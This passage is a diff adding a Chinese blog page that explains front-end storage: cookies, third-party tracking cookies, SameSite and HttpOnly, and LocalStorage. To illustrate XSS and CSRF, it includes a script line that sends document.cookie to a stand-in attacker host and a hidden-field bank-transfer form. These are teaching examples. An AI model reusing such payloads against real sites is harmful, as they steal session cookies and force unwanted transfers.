@@ -1,0 +1,1710 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="深入浅出前端缓存, gongchenghui,github">
+    <meta name="description" content="引言2021 年，如果你的前端应用，需要在浏览器上保存数据，有三个主流方案：
+
+Cookie
+Web Storage (LocalStorage)
+IndexedDB
+
+这些方案就是如今应用最广、浏览器兼容性最高的三种前端储存方案
+今天这篇">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>深入浅出前端缓存 | gongchenghui</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">gongchenghui</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>主页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-rocket"></i>
+            
+            <span>工具</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">gongchenghui</div>
+        <div class="logo-desc">
+            
+            北冥有鱼，其名为鲲，鲲之大，不知其几千里也； 化而为鸟，其名为鹏.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                主页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-rocket"></i>
+                
+                工具
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/gongchenghuigch/gongchenghuigch.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/gongchenghuigch/gongchenghuigch.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        深入浅出前端缓存
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Cookie/" target="_blank">
+                                <span class="chip bg-color">Cookie</span>
+                            </a>
+                        
+                            <a href="/tags/Storage/" target="_blank">
+                                <span class="chip bg-color">Storage</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/前端/" class="post-category" target="_blank">
+                                前端
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-04-27
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        6.7k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        25 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>2021 年，如果你的前端应用，需要在浏览器上保存数据，有三个主流方案：</p>
+<ul>
+<li>Cookie</li>
+<li>Web Storage (LocalStorage)</li>
+<li>IndexedDB</li>
+</ul>
+<p>这些方案就是如今应用最广、浏览器兼容性最高的三种前端储存方案</p>
+<p>今天这篇文章就聊一聊这三种方案的历史，优缺点，以及各自在今天的适用场景</p>
+<p>文章在后面还会提出一个全新的，基于 IndexedDB 的，更适合现代前端应用的前端本地储存方案 <code>GoDB.js</code></p>
+<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="Cookie-的历史"><a href="#Cookie-的历史" class="headerlink" title="Cookie 的历史"></a>Cookie 的历史</h3><p>Cookie 早在1994 年就被发明了出来，它的历史甚至和互联网本身的历史一样悠久</p>
+<p>和其它两种本地储存方案不一样的是，Cookie 本身并不是为了解决「在浏览器上存东西」而被发明，它的出现是为了解决 HTTP 协议无状态特性的问题</p>
+<p>什么是 HTTP 协议的无状态特性？简单来说就是：用户的两次 HTTP 请求，服务端并不能通过请求本身，知道这两次请求，来自于同一个用户</p>
+<p>比如我们如今司空见惯的登录功能，在 Cookie 被发明之前其实几乎无法实现登录态的长久保持</p>
+<p>也就是说，Cookie 其实是作为「HTTP 协议的补充」被发明出来的，因此，在英文语境中，大多时候其实都用 <code>HTTP cookie</code> 来指 Cookie</p>
+<p>Cookie 最初被其发明者 Lou Montulli 用在电商网站上，用来记录购物车里的商品，这样当用户想要结账时，浏览器会把 Cookie 里的商品数据以及用户信息发送给服务器，服务器就能知道用户想要购买哪些商品</p>
+<p>Cookie 在很长一段时间内，都是浏览器储存数据的唯一解决方案，直到今天，Cookie 在很多领域仍然有大量的使用</p>
+<h3 id="Cookie-的今天"><a href="#Cookie-的今天" class="headerlink" title="Cookie 的今天"></a>Cookie 的今天</h3><p>2021 年，虽然 Cookie 在部分领域仍有不可替代的价值，但其已经不再适合被做为一个前端本地储存方案去使用：</p>
+<ul>
+<li><p>Cookie 的安全问题</p>
+</li>
+<li><ul>
+<li>Cookie 在每次请求中都会被发送，如果不使用 HTTPS 并对其加密，其保存的信息很容易被窃取，导致安全风险</li>
+<li>举个例子，在一些使用 Cookie 保持登录态的网站上，如果 Cookie 被窃取，他人很容易利用你的 Cookie 来假扮成你登录网站</li>
+<li>当然可以用 Session 配合 Cookie 来缓解这个问题，但是 Session 会占用额外的服务器资源</li>
+<li>Cookie 每次请求自动发送的特性还会导致 CSRF 攻击的安全风险</li>
+</ul>
+</li>
+<li><p>Cookie 只允许储存 4kb 的数据</p>
+</li>
+<li><p>Cookie 的操作较为繁琐复杂（这一点倒是可以通过使用类库来解决）</p>
+</li>
+</ul>
+<p>有人说由于浏览器每次请求都会带上 Cookie，因此 Cookie 还有个缺点是会增加带宽占用，但其实放在今天的网络环境来看，这点占用基本可以忽略不计</p>
+<p>总之，如今已经不推荐使用 Cookie 来在浏览器上保存数据，大部分曾经应用 Cookie 的场景，在今天都可以用 LocalStorage 实现更优雅更安全的替代</p>
+<p><strong>但是</strong>，即使 Cookie 已经不适合用来在浏览器上储存数据，其在某些特定领域，在今天仍然独特的价值</p>
+<p>最常见的就是用在广告中，用来跨站标记用户与跟踪用户行为，这样在你访问不同页面时，广告商也能知道是同一个用户在访问，从而实现后续的商品推荐等功能</p>
+<p>假设 <code>abc.com</code> 和 <code>xyz.com</code> 都内嵌了淘宝的广告，你会发现即使 <code>abc.com</code> 和 <code>xyz.com</code> 所有者不一致，两个网站上淘宝广告推荐的商品也出奇的一致，这背后是因为淘宝知道是同一个人，分别在 <code>abc.com</code> 和 <code>xyz.com</code> 访问淘宝的广告</p>
+<p>这是如何实现的呢？答案是第三方 Cookie</p>
+<h3 id="第三方-Cookie"><a href="#第三方-Cookie" class="headerlink" title="第三方 Cookie"></a>第三方 Cookie</h3><p>之所以有第三方 Cookie 这个称呼，是因为 Cookie 执行同源策略，<code>a.com</code> 和 <code>b.com</code> 各自只能访问自己的 Cookie，无法访问对方或者任何不属于自己的 Cookie</p>
+<p>如果在访问 <code>a.com</code> 时，设置了一个 <code>b.com</code> 的 Cookie（比如内嵌 <code>b.com</code> 的页面），那么这个 Cookie 相对于 <code>a.com</code> 而言就是第三方 Cookie</p>
+<p>值得一提的是，是同一个 host 下的不同端口倒是可以互相访问 Cookie</p>
+<p>这里提一下对第三方 Cookie 而言非常重要的一个特性：<strong>Cookie 可以被服务端设置</strong></p>
+<p>服务器可以通过 response 的请求头来要求浏览器设置 Cookie</p>
+<pre class="line-numbers language-js"><code class="language-js">Set<span class="token operator">-</span>Cookie<span class="token punctuation">:</span> userId<span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>浏览器在检测到返回请求的 header 里有 Set-Cookie 请求头后，就会自动设置 Cookie，不需要开发者用 JS 去做额外的操作</p>
+<p>这样带来的好处是，当 <code>abc.com</code> 和 <code>xyz.com</code> 想在自己的网页上内嵌淘宝广告时，只需要把淘宝提供的组件放进 HTML 即可，不需要写额外的 JS，也能让淘宝进行跨站定位用户</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"taobao.com/some-ads"</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>（这个组件纯属虚构，仅为方便理解）</p>
+<p>它是如何工作的呢？</p>
+<ol>
+<li>当用户处于 <code>abc.com</code> 时，浏览器会向 <code>taobao.com/some-ads</code> 发起一个 HTTP 请求</li>
+<li>当淘宝服务器返回广告内容时，会顺带一个 <code>Set-Cookie</code> 的 HTTP 请求头，告诉浏览器设置一个源为 <code>taobao.com</code> 的 Cookie，里面存上当前用户的 ID 等信息</li>
+<li>这个 Cookie 相对于 <code>abc.com</code> 而言就是第三方 Cookie，因为它属于 <code>taobao.com</code></li>
+<li>而当用户访问 <code>xyz.com</code> 时，由于 <code>xyz.com</code> 上也嵌入了淘宝的广告，因此用户的浏览器也会向 <code>taobao.com/some-ads</code> 发起请求</li>
+<li>有意思的来了，发请求时，浏览器发现本地已有 <code>taobao.com</code> 的 Cookie（此前访问 <code>abc.com</code> 时设置的），因此，浏览器会将这个 Cookie 发送过去</li>
+<li>淘宝服务器根据发过来的 Cookie，发现当前访问 <code>xyz.com</code> 的用户和之前访问 <code>abc.com</code>的用户是同一个，因此会返回相同的广告</li>
+</ol>
+<p>广告商用第三方 Cookie 来跨站定位用户大概就是这么个过程，实际肯定要复杂许多，但基本原理是一致的</p>
+<p>总之，关键就是利用了 Cookie 的两个特点</p>
+<ul>
+<li>Cookie 可以被服务器设置</li>
+<li>浏览器每次请求会自动带上 Cookie</li>
+</ul>
+<p>正因为这两个特点，即使 Cookie 在今天看来缺点一大堆，但仍然在部分领域有不可替代的价值</p>
+<p>但也是因为这两个特点，导致 Cookie 的安全性相对不高，总之 Cookie 的这个设计放在今天来看，就是一把双刃剑</p>
+<h3 id="Cookie-配置"><a href="#Cookie-配置" class="headerlink" title="Cookie 配置"></a>Cookie 配置</h3><p>服务端要求浏览器建立 Cookie 时，可以在请求头里放一些配置声明，修改 Cookie 的使用特性</p>
+<h4 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h4><p>在前段时间，Chrome 更新 80 版本时，将 Cookie 的跨站策略（SameSite）默认设置为了 <code>Lax</code>，即仅允许同站或者子站访问 Cookie，而老版本是 <code>None</code>，即允许所有跨站 Cookie</p>
+<p>这会导致用户访问 <code>xyz.com</code> 时，浏览器默认将不会发送 Cookie 给 <code>taobao.com</code>，导致第三方 Cookie 失效的问题</p>
+<p>要解决的话，在返回请求的 header 里将 SameSite 设置为 <code>None</code> 即可</p>
+<pre><code>Set-Cookie: userId=123; SameSite=None</code></pre><h4 id="Secure-HttpOnly"><a href="#Secure-HttpOnly" class="headerlink" title="Secure, HttpOnly"></a>Secure, HttpOnly</h4><p>Cookie 还有两个常用属性 <code>Secure</code> 和 <code>HttpOnly</code></p>
+<pre><code>Set-Cookie: userId=123; SameSite=None; Secure; HttpOnly</code></pre><p>其中 <code>Secure</code> 是只允许 Cookie 在 HTTPS 请求中被使用</p>
+<p>而 <code>HttpOnly</code> 则用来禁止使用 JS 访问 cookie</p>
+<pre><code>ducoment.cookie // 访问被禁止了</code></pre><p>这样最大的好处是避免了 XSS 攻击</p>
+<h4 id="XSS-攻击"><a href="#XSS-攻击" class="headerlink" title="XSS 攻击"></a>XSS 攻击</h4><p>比如你在水一个论坛，这个论坛有个 bug：不会对发布内容中的 HTML 标签进行过滤</p>
+<p>某一天，一个恶意用户发了个帖子，内容如下：</p>
+<pre><code>&lt;script&gt;window.open(&quot;atacker.com?cookie=&quot; + document.cookie&lt;/script&gt; </code></pre><p>当你访问这条帖子的内容时，浏览器就会执行 <code>&lt;script&gt;</code> 中的代码，导致你的 Cookie 被发送给攻击者，接着攻击者就可以利用你的 Cookie 登录论坛，然后为所欲为了</p>
+<p>XSS 攻击在很多情况下，用户甚至不会知道自己被攻击了，比如利用 <code>&lt;img/&gt;</code> 的 <code>src</code> 属性，就可以做到悄无声息的把用户的信息发给攻击者</p>
+<p>而当设置了 <code>HttpOnly</code> 后，<code>ducoment.cookie</code> 将获取不到 Cookie，攻击者的代码自然就无法生效了</p>
+<p><strong>Cookie 总结</strong></p>
+<p>总而言之，Cookie 在今天的适用场景其实比较有限，当你需要在本地储存数据时，由于安全性和储存空间的问题，一般不推荐使用 Cookie，大部分情况下使用 Web Storage 是个更好的选择</p>
+<h2 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h2><p>在 2014 年年底发布的 HTML5 标准中，新增了一个 Web Storage 的本地储存方案，其包括</p>
+<ul>
+<li>LocalStorage</li>
+<li>SessionStorage</li>
+</ul>
+<p>SessionStorage 和 LocalStorage 使用方法基本一致，唯一不同的是，一旦关闭页面，SessionStorage 将会删除数据；因此这里主要以 LocalStorage 为例</p>
+<p>LocalStorage 的特点是：</p>
+<ul>
+<li>使用 Key-Value 形式储存</li>
+<li>使用很方便</li>
+<li>大小有 10MB</li>
+<li>Key 和 Value 以字符串形式储存</li>
+</ul>
+<p>LocalStorage 的使用非常简单，比如要在本地保存 <code>userId</code>：</p>
+<pre class="line-numbers language-js"><code class="language-js">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'userId'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'userId'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>只要用 <code>setItem</code> 保存过一次，哪怕用户关闭了页面，再次打开页面时都可以用 <code>getItem</code> 获取到想要的数据</p>
+<p>LocalStorage 一出现，就在许多应用场景彻底替代了 Cookie，大部分需要在浏览器上存数据的场景，都会优先使用 LocalStorage</p>
+<p>它和 Cookie 的主要区别是：</p>
+<ul>
+<li>储存空间更大，使用更方便</li>
+<li>Cookie 可以被服务器设置，而 LocalStorage 只能前端手动操作</li>
+<li>Cookie 的数据会由浏览器自动发给服务器，LocalStorage 需要手动取出来放到请求里面才会发给服务器，因此可以避免 CSRF 攻击</li>
+</ul>
+<h3 id="CSRF-攻击"><a href="#CSRF-攻击" class="headerlink" title="CSRF 攻击"></a>CSRF 攻击</h3><p>假设你在浏览器中登录过某个银行 <code>bank.com</code>，这个银行系统使用 Cookie 来保存你的登录态</p>
+<p>接着你访问了一个恶意网站，该网站中有一个表单：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bank.com/transfer<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>amount<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100000.00<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>target<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>attacker<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>屠龙宝刀，点击就送!<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>（假设 <code>bank.com/transfer</code> 是用来转账的接口）</p>
+<p>当你被诱导点下了提交按钮后：</p>
+<ol>
+<li>由于 form 表单提交是可以跨域的，你将会对 <code>bank.com/transfer</code> 发起一次 POST 请求</li>
+<li>由于此前你已经登录过 <code>bank.com</code>，浏览器会自动将你的 Cookie 一并发送过去（即使你当前并未处于银行系统的页面）</li>
+<li><code>bank.com</code> 收到你的带 Cookie 的请求后，认为你是正常登录了的，导致转账成功进行</li>
+<li>最终你损失了一大笔钱</li>
+</ol>
+<p>注意即使用 Cookie 配合 HTTPS 请求，CSRF 攻击也无法被避免，因为 HTTPS 请求只是对传输的数据进行了加密，而 CSRF 攻击的特点是，诱导你去访问某个需要你的权限的接口，HTTPS 并不能阻止这种访问</p>
+<p>这里的 CSRF 攻击的核心，就是利用了浏览器会自动在所有请求里带上 Cookie 的特性</p>
+<p>因此，LocalStorage 比较常见的一个替代 Cookie 的场景就是登录态的保持，比如用 token 的方法加上 HTTPS 请求，就可以很大程度上提高登录的安全性，避免被 CSRF 攻击（但是依然无法完全避免被 XSS 攻击的风险）</p>
+<p>大概工作流程就是，用户登录后，从服务器拿到一个 token，然后存进 LocalStorage 里，之后每次请求前都从 LocalStorage 里取出 token，放到请求数据里，服务器就能知道是同一个用户在发起请求了；由于 HTTPS 的存在，也不用担心 token 会被泄露给第三方，因此是很安全的</p>
+<p>总结为什么 LocalStorage 在大部分应用场景替代了 Cookie：</p>
+<ul>
+<li>LocalStorage 更好用，更简单，储存空间更多</li>
+<li>LocalStorage 免去了 Cookie 遭受 CSRF 攻击的风险</li>
+</ul>
+<h3 id="LocalStorage-的缺点"><a href="#LocalStorage-的缺点" class="headerlink" title="LocalStorage 的缺点"></a>LocalStorage 的缺点</h3><p>但是，LocalStorage 也不是完美的，它有两个缺点：</p>
+<ul>
+<li>无法像 Cookie 一样设置过期时间</li>
+<li>只能存入字符串，无法直接存对象</li>
+</ul>
+<p>举个例子，假如你想存一个对象或者非 string 的类型到 LocalStorage：</p>
+<pre class="line-numbers language-js"><code class="language-js">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>name<span class="token punctuation">:</span> <span class="token string">'value'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// '[object, Object]'</span>
+
+localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// '1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>你会发现，存进去的如果是对象，拿出来就变成了字符串 <code>&#39;[object, object]&#39;</code>，数据丢失了！</p>
+<p>存进去的如果是 number，拿出来也变成了 string</p>
+<p>要解决这个问题，一般是使用 <code>JSON.stringify()</code> 配合 <code>JSON.parse()</code></p>
+<pre><code>localStorage.setItem(&#39;key&#39;, JSON.stringify({name: &#39;value&#39;}));
+console.log(JSON.parse(localStorage.getItem(&#39;key&#39;))); // {name: &#39;value&#39;}</code></pre><p>这样，就可以实现对象和非 string 类型的储存了</p>
+<p><strong>但是</strong>，这么做有一个缺点，那就是 <code>JSON.stringify()</code> 本身是存在一些问题的</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> a <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+    a<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>
+    b<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+    c<span class="token punctuation">:</span> <span class="token regex">/abc/</span><span class="token punctuation">,</span>
+    d<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
